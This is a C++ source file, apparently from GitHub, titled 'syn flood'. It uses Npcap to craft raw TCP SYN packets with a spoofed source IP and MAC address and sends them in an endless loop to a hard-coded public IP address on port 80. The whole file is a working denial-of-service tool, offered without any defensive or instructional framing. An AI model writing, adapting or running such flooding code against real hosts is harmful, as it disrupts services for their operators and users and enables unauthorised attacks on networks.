#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <pcap.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <stdexcept>
#include <cstdint>
#include <cstring>
#pragma comment(lib,"wpcap.lib")
#pragma comment(lib,"ws2_32.lib")
using namespace std;
//-lpsapi -lntdll -lgdi32 -std=c++14 -O2 -s -lws2_32 -m32 -lwpcap
/*
Downland Npcap SDK : https://npcap.com/#download
*/
// 以太网头
struct EthernetHeader {
    uint8_t dest[6];
    uint8_t src[6];
    uint16_t type;
};
// IPv4 头
struct IPHeader {
    uint8_t  ihl_version;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};
// TCP 头
struct TCPHeader {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint8_t  doff_res;
    uint8_t  flags;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};
// TCP 伪首部，用于校验和
struct PseudoHeader {
    uint32_t saddr;
    uint32_t daddr;
    uint8_t  zero;
    uint8_t  protocol;
    uint16_t length;
};
// 简单 16位校验和
uint16_t checksum(uint16_t* buf, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buf++;
        size -= 2;
    }
    if (size) { // 处理奇数字节
        sum += *(uint8_t*)buf;
    }
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}
int cnt = 0;
class syngj {
public:
    syngj(const char* devname) {
        char errbuf[PCAP_ERRBUF_SIZE]{};
        handle = pcap_open_live(devname, 65536, 0, 1, errbuf);
        if (!handle) {
            throw std::runtime_error(std::string("pcap_open_live failed: ") + errbuf);
        }
    }
    ~syngj() {
        if (handle) pcap_close(handle);
    }
    void sendone(const uint8_t* src_mac,
                 const uint8_t* dst_mac,
                 const char* src_ip, uint16_t src_port,
                 const char* dst_ip, uint16_t dst_port) {
        uint8_t packet[14 + sizeof(IPHeader) + sizeof(TCPHeader)];
        memset(packet, 0, sizeof(packet));
        // 以太网头
        EthernetHeader* eth = (EthernetHeader*)packet;
        memcpy(eth->dest, dst_mac, 6);
        memcpy(eth->src, src_mac, 6);
        eth->type = htons(0x0800); // IPv4
        // IP 头
        IPHeader* ip = (IPHeader*)(packet + sizeof(EthernetHeader));
        ip->ihl_version = (4 << 4) | (sizeof(IPHeader) / 4);
        ip->tos = 0;
        ip->tot_len = htons(sizeof(IPHeader) + sizeof(TCPHeader));
        ip->id = htons(54321);
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = inet_addr(src_ip);
        ip->daddr = inet_addr(dst_ip);
        ip->check = checksum((uint16_t*)ip, sizeof(IPHeader));
        // TCP 头
        TCPHeader* tcp = (TCPHeader*)((uint8_t*)ip + sizeof(IPHeader));
        tcp->source = htons(src_port);
        tcp->dest   = htons(dst_port);
        tcp->seq    = htonl(0);
        tcp->ack_seq= 0;
        tcp->doff_res = (sizeof(TCPHeader) / 4) << 4;
        tcp->flags  = 0x02; // SYN
        tcp->window = htons(5840);
        tcp->check  = 0;
        tcp->urg_ptr= 0;
        // TCP 校验和
        PseudoHeader psh{};
        psh.saddr = ip->saddr;
        psh.daddr = ip->daddr;
        psh.zero = 0;
        psh.protocol = IPPROTO_TCP;
        psh.length = htons(sizeof(TCPHeader));
        uint8_t pseudo[sizeof(PseudoHeader) + sizeof(TCPHeader)];
        memcpy(pseudo, &psh, sizeof(PseudoHeader));
        memcpy(pseudo + sizeof(PseudoHeader), tcp, sizeof(TCPHeader));
        tcp->check = checksum((uint16_t*)pseudo, sizeof(pseudo));
        // 发送
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            throw std::runtime_error(std::string("pcap_sendpacket failed: ") + pcap_geterr(handle));
        }
        //std::cout << "Sent SYN to " << dst_ip << ":" << dst_port << "\n";
        cnt++;
    }
private:
    pcap_t* handle{};
};
int main(){
	cout<<"syn flood\nby hetianyu313(github)\n";
	try{
		pcap_if_t* alldevs;
        char errbuf[PCAP_ERRBUF_SIZE];
        if (pcap_findalldevs(&alldevs, errbuf) == -1) {
            throw std::runtime_error(errbuf);
        }
        if (!alldevs) throw std::runtime_error("No device found");

        // 列出所有 Npcap 设备
        int idx = 0;
        for (pcap_if_t* d = alldevs; d; d = d->next) {
            std::cout << "[" << idx << "] " 
                      << (d->description ? d->description : "No description") 
                      << " (" << d->name << ")\n";
            idx++;
        }

        // 让用户输入编号选择
        std::cout << "请输入要使用的设备编号: ";
        int choice;
        std::cin >> choice;

        if (choice < 0 || choice >= idx) {
            throw std::runtime_error("设备编号无效");
        }

        // 找到对应设备
        pcap_if_t* selected = alldevs;
        for (int i = 0; i < choice; i++) {
            selected = selected->next;
        }

        std::string devname = selected->name;
        std::cout << "Using device: " << devname << "\n";

        // 初始化发送类
        syngj syn(devname.c_str());

        uint8_t src_mac[6] = {0x00, 0x0C, 0x29, 0xAB, 0xCD, 0xEF};
        uint8_t dst_mac[6] = {0x00, 0x50, 0x56, 0x12, 0x34, 0x56};
        while (true) {
            syn.sendone(src_mac, dst_mac, "192.168.0.50", 12345,"123.60.188.246", 80);
            cnt++;
            if (cnt % 2000 == 0) {
                std::cout << "Sent " << cnt << " packets\n";
            }
        }

        pcap_freealldevs(alldevs);
    }
    catch (std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
    }
}
